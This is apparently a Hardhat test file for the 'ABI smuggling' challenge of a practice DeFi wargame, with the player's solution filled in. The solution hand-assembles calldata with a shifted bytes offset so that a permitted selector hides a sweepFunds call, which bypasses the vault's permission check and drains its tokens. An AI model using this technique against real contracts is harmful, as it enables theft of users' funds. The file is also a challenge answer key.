const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] ABI smuggling', function () {
    let deployer, player, recovery;
    let token, vault;
    
    const VAULT_TOKEN_BALANCE = 1000000n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [ deployer, player, recovery ] = await ethers.getSigners();

        // Deploy Damn Valuable Token contract
        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();

        // Deploy Vault
        vault = await (await ethers.getContractFactory('SelfAuthorizedVault', deployer)).deploy();
        expect(await vault.getLastWithdrawalTimestamp()).to.not.eq(0);

        // Set permissions
        const deployerPermission = await vault.getActionId('0x85fb709d', deployer.address, vault.address);
        const playerPermission = await vault.getActionId('0xd9caed12', player.address, vault.address);
        await vault.setPermissions([deployerPermission, playerPermission]);
        expect(await vault.permissions(deployerPermission)).to.be.true;
        expect(await vault.permissions(playerPermission)).to.be.true;

        // Make sure Vault is initialized
        expect(await vault.initialized()).to.be.true;

        // Deposit tokens into the vault
        await token.transfer(vault.address, VAULT_TOKEN_BALANCE);

        expect(await token.balanceOf(vault.address)).to.eq(VAULT_TOKEN_BALANCE);
        expect(await token.balanceOf(player.address)).to.eq(0);

        // Cannot call Vault directly
        await expect(
            vault.sweepFunds(deployer.address, token.address)
        ).to.be.revertedWithCustomError(vault, 'CallerNotAllowed');
        await expect(
            vault.connect(player).withdraw(token.address, player.address, 10n ** 18n)
        ).to.be.revertedWithCustomError(vault, 'CallerNotAllowed');
    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */

        // We're going to make our call to the execute function manually
        // In order to smuggle the abi
        // Get the firsts 4 bytes of our call
        // They're gonna be the execute function selector
        const executeFunction = await vault.interface.getFunction("execute");
        const executeSelector = await vault.interface.getSighash(executeFunction);

        // Get the first argument with a padding of 32 bytes
        const vaultAddress = await ethers.utils.hexZeroPad(vault.address, 32);

        // The second argument are bytes
        // Because the bytes it's a dynamic type of data it has an offset and a size
        // The function execute check in a fixed position where the function selector is
        // If we change the offset of the bytes to where starts our true function
        // We can smuggle the function sweepFunds bypassing the permission checker
        const newOffset = await ethers.utils.hexZeroPad("0x64", 32);

        // Next we're going to fill the next 32 bytes with empty data
        const empty32Bytes = await ethers.utils.hexZeroPad("0x0", 32);

        // Finally at this position goes the withdraw selector
        const withdrawFunction = await vault.interface.getFunction("withdraw");
        const withdrawSelector = await vault.interface.getSighash(withdrawFunction);

        // Now we're going to need the size of the sweepFunds function
        const newSize = await ethers.utils.hexZeroPad("0x44", 32);

        // Finally we can put here the sweepFunds function
        const sweepFundsData = await vault.interface.encodeFunctionData("sweepFunds", [
            recovery.address,
            token.address
        ]);

        // Concat all hex data we have
        const data = await ethers.utils.hexConcat([
            executeSelector,
            vaultAddress,
            newOffset,
            empty32Bytes,
            withdrawSelector,
            newSize,
            sweepFundsData
        ])

        await player.sendTransaction({ to: vault.address, data })

        console.log({vault: await token.balanceOf(vault.address)});
        console.log({player: await token.balanceOf(player.address)});
        console.log({recovery: await token.balanceOf(recovery.address)});
    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
        expect(await token.balanceOf(vault.address)).to.eq(0);
        expect(await token.balanceOf(player.address)).to.eq(0);
        expect(await token.balanceOf(recovery.address)).to.eq(VAULT_TOKEN_BALANCE);
    });
});
